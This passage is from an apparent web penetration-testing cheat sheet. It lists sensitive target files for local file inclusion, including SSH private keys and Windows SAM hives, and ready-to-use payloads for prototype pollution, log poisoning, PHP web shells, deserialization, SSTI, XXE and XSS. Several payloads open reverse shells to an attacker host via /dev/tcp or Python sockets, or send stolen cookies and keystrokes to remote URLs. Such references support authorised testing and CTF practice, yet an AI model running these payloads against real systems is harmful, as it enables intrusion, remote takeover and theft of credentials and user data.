/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/proc/self/cwd/app.py
/proc/sched_debug
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/<vhost>/__init__.py
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

### LFI File Downloader

#### lfidownloader.py

```c
import requests
from  pathlib import Path
import base64

# Files to Download:
# /proc/sched_debug
# /proc/<<PID>>/maps
# /usr/lib/x86_64-linux-gnu/libc-2.31.so
# /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6

base64_content    = "php://filter/convert.base64-encode/resource="
paint_text_content = "php://filter/read=string/resource="

remote  = "/proc/sched_debug"
result  = requests.get(f"http://<RHOST>/index.php?page={base64_content}{remote}").content

try:
  with open(f"temp/{Path(remote).name}", "wb") as file:
      file.write(base64.b64decode(result))
      file.close()
except:
  pass

print(f"Received : \n {remote} ")
```

## Lodash

> https://github.com/lodash/lodash

### Payload

```c
$ curl -X PUT -H 'Content-Type: application/json' http://127.0.0.1:<RPORT> --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"constructor":{"__proto__":{"canUpload":true,"canDelete":true}}}'
```

### Reverse Shell Payload

```c
$ curl --header "Content-Type: application/json" --request POST http://127.0.0.1:<RPORT>/upload --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"filename":"& echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAzIDA+JjEK|base64 -d|bash"}'
```

## Log Poisoning

### SSH auth.log Poisoning

```c
$ ssh "<?php phpinfo();?>"@<LHOST>
$ http://<RHOST>/view.php?page=../../../../../var/log/auth.log
```

## mitmproxy

```c
$ mitmproxy
```

## ngrok

> https://ngrok.com/

```c
$ ngrok tcp 9001
```

## PadBuster

> https://github.com/AonCyberLabs/PadBuster

```c
$ padbuster http://<RHOST> MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB 8 -cookie auth=MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB -plaintext user=admin
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>"
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>" -plaintext "{\"user\":\"<USERNAME>\",\"role\":\"admin\"}"
```

## PDF PHP Inclusion

### Create a File with a PDF Header, which contains PHP Code

```c
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

### Trigger

```c
$ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

## PHP

### phpinfo Dump

```c
file_put_contents to put <?php phpinfo(); ?>
```

### PHP Deserialization (Web Server Poisoning)

#### Finding PHP Deserialization Vulnerability

```c
$ grep -R serialize
```

```c
/index.php:        base64_encode(serialize($page)),
/index.php:unserialize($cookie);
```

#### Skeleton Payload

```c
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID',
        base64_encode(serialize($page)),
        time()+60*60*24,
        '/'
    );
}
```

#### Decoding and Web Server Poisoning

```c
$ echo "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9" | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

#### Encoding

```c
$ python
Python 2.7.18 (default, Apr 28 2021, 17:39:59) 
[GCC 10.2.1 20210110] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> len("/www/index.html")
15
```

```c
$ echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
```

#### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: <?php system('cat /');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30K
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

### PHP eval()

#### Exploiting eval() base64 payload

```c
${system(base64_decode(b64-encoded-command))}
```

### PHP Generic Gadget Chains (PHPGGC)

> https://github.com/ambionics/phpggc

#### Dropping a File

```c
$ phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

### PHP Injection

#### Skeleton Payload Request

```c
POST /profilepicture.php HTTP/1.1
...
Connection: close
Cookie: PHPSESSID=bot0hfe9lt6mfjnki9ia71lk2k
Upgrade-Insecure-Requests: 1

<PAYLOAD>
```

#### Payloads

```c
url=/etc/passwd
url=file:////home/<USERNAME>/.ssh/authorized_keys
<?php print exec(ls) ?>
```

### PHP preg_replace()

#### Exploitation

> https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

```c
pattern=/ip_address/e&ipaddress=system('id')&text="openvpn": {
```

#### Remote Code Execution

```c
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Origin: http://www.securewebinc.jet
DNT: 1
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords%5B%2Ffuck%2Fi%5D=make+love&swearwords%5B%2Fshit%2Fi%5D=poop&swearwords%5B%2Fass%2Fi%5D=behind&swearwords%5B%2Fdick%2Fi%5D=penis&swearwords%5B%2Fwhore%2Fi%5D=escort&swearwords%5B%2Fasshole%2Fi%5D=bad+person&to=test%40test.de&subject=test&message=%3Cp%3Etest%3Cbr%3E%3C%2Fp%3E&_wysihtml5_mode=1
```

#### Skeleton Payload Request

```c
POST /dirb_safe_dir_rf9EmcEIx/admin/email.php?cmd=ls HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 259
Connection: close
Referer: http://<RHOST>/dirb_safe_dir_rf9EmcEIx/admin/dashboard.php
Cookie: PHPSESSID=4bsdjba9nanh5nc6off028k403
Upgrade-Insecure-Requests: 1

swearwords[/fuck/ie]=system($_GET["cmd"])&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=badperson&to=nora@example.com&subject=sdfj&message=swearwords[/fuck/]&_wysihtml5_mo
de=1
```

### PHP strcmp

#### Bypass

```c
if (!empty($_POST['username']) && !empty($_POST['password'])) {
    require('config.php');
    if (strcmp($username, $_POST['username']) == 0) {
        if (strcmp($password, $_POST['password']) == 0) {
            $_SESSION['user_id'] = 1;
            header("Location: ../upload.php");
        } else {
            print("<script>alert('Wrong Username or Password')</script>");
        }
    } else {
        print("<script>alert('Wrong Username or Password')</script>");
    }
}
```

##### Explaination

The developer is using `strcmp` to check the `username` and `password`, which is insecure and can easily be bypassed.

This is due to the fact that if `strcmp` is given an `empty array` to compare against the `stored password`, it will return `null`.

In PHP the `==` operator only checks the value of a variable for `equality`, and the value of `NULL` is equal to `0`.

The correct way to write this would be with the === operator which checks both value and type. Let's open `Burp Suite` and catch the login request.

#### Bypassing

Change `POST` data as follows to bypass the login.

```c
username[]=admin&password[]=admin
```

### PHP verb File Upload

```c
$ curl -X PUT -d '<?php system($_GET["c"]);?>' http://<RHOST>/<FILE>.php
```

## Poison Null Byte

### Error Message

`Only .md and .pdf files are allowed!`

### Example

```c
%00
```

### Bypass

```c
$ curl http://<RHOST>/ftp/package.json.bak%2500.md
```

## Remote File Inclusion (RFI)

```c
$ http://<RHOST>/PATH/TO/FILE/?page=http://<RHOST>/<FILE>.php
```

### Root Cause Function

```c
allow_url_fopen
```

### Code Execution

```c
$ User-Agent: <?system('wget http://<LHOST>/<FILE>.php -O <FILE>.php');?>
$ http://<RHOST>/view.php?page=../../../../../proc/self/environ
```

### WAF Bypass

```
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php%00
$ http://<RHOST>/page=http://<LHOST>/<SHELL>.php?
```

## Server-Side Request Forgery (SSRF)

### &x=

```c
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

The payload ending in `&x=` is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.

### Bypass

```c
http://localhost
http://127.0.0.1
http://2130706433
http://0177.1
http://0x7f.1
http://127.000.000.1
http://127.0.0.1.nip .io
http://[::1]
http://[::]
```

## Server-Side Template Injection (SSTI)

### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```c
${{<%[%'"}}%\.
```

### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```c
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

### Jinja

```c
{{malicious()}}
```

### Jinja2

```c
</title></item>{{4*4}}
```

### Payload

```c
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Payload

```c
{{''.__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
```

### Evil Config

#### Config

```c
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
```

#### Load Evil Config

```c
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
```

#### Connect to Evil Host

```c
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',shell=True) }}
```

#### Example

```c
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

## Upload Vulnerabilities

```c
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

## Web Log Poisoning

```c
nc <RHOST> <RPORT>
GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
Host: <RHOST>
Connection: close

http://<RHOST>/view.php?page=../../../../../var/log/apache2/access.log&cmd=id
```

## Wfuzz

> https://github.com/xmendez/wfuzz

```c
$ wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

### Write to File

```c
$ wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

### Custom Scan with limited Output

```c
$ wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

### Fuzzing two Parameters at once

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

### Domain

```c
$ wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>.<tld>' -u http://<RHOST>/
```

### Subdomain

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

### Git

```c
$ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
### Login

```c
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
$ wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
```

### SQL

```c
$ wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

### DNS

```c
$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
$ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

### Numbering Files

```c
$ wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

### Enumerating PIDs

```c
$ wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

## WhatWeb

> https://github.com/urbanadventurer/WhatWeb

```c
$ whatweb -v -a 3 <RHOST>
```

## Wordpress

### Config Path

```c
/var/www/wordpress/wp-config.php
```

## WPScan

```c
$ wpscan --url https://<RHOST> --disable-tls-checks
$ wpscan --url https://<RHOST> --disable-tls-checks --enumerate u
$ target=<RHOST>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
$ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

## XML External Entity (XXE)

### Prequesites

Possible JSON Implementation

### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

### Payloads

```c
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```c
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```c
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

```c
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\
x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAxIDA+JjEK | base64 -d | b
ash")["read"]() %} a {% endwith %}
```

## XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)

> https://github.com/0xInfection/XSRFProbe

```c
$ xsrfprobe -u https://<RHOST> --crawl --display
```

## Cross-Site Scripting (XSS)

aka JavaScript Injection.

### Reflected XSS

```c
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
```

### Reflected XSS at Scale

```c
$ subfinder -d <RHOST> -silent -all | httpx -silent | nuclei -tags xss -exclude-severity info -rl 20 -c 10 -o /PATH/TO/FILE/<FILE>
```

### Stored XSS

```c
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
```

### Session Stealing

```c
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
```

### Key Logger

```c
<script>document.onkeypress = function(e) { fetch('https://<RHOST>/log?key=' + btoa(e.key) );}</script>
```

### Business Logic

JavaScript is calling `user.changeEmail()`. This can be abused.

```c
<script>user.changeEmail('user@domain');</script>
```

### Polyglot

```c
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

### Single XSS Vector

```c
JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
```

### DOM-XSS

#### Main sinks that can lead to DOM-XSS Vulnerabilities

```c
## document.write()
## document.writeln()
## document.domain
## someDOMElement.innerHTML
## someDOMElement.outerHTML
## someDOMElement.insertAdjacentHTML
## someDOMElement.onevent
```

### jQuery Function sinks that can lead to DOM-XSS Vulnerabilities

```c
## add()
## after()
## append()
## animate()
## insertAfter()
## insertBefore()
## before()
## html()
## prepend()
## replaceAll()
## replaceWith()
## wrap()
## wrapInner()
## wrapAll()
## has()
## constructor()
## init()
## index()
## jQuery.parseHTML()
## $.parseHTML()
```

### Skeleton Payload Request

```c
POST /blog-single.php HTTP/1.1
Host: <RHOST>
User-Agent: <script src="http://<LHOST>:<LPORT>/test.html"></script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Origin: http://<RHOST>
DNT: 1
Connection: close
Referer: http://<RHOST>/blog.php
Upgrade-Insecure-Requests: 1

name=test&email=test%40test.de&phone=1234567890&message=<script
src="http://<LHOST>:<LPORT>/test.html"></script>&submit=submit
```

### XSS POST Request

#### XSS post request on behalf of the Victim, with custom Cookies.

```c
var xhr = new XMLHttpRequest();
document.cookie = "key=value;";
var uri ="<target_uri>";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("<post_body>");
```

### XSS Web Request

#### XSS web Request on behalf of Victim and sends back the complete Webpage.

```c
xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", '<local_url>?'+xmlhttp.response);
  x.send(null);
}
xmlhttp.open("GET", '<RHOST>');
xmlhttp.send(null);
```
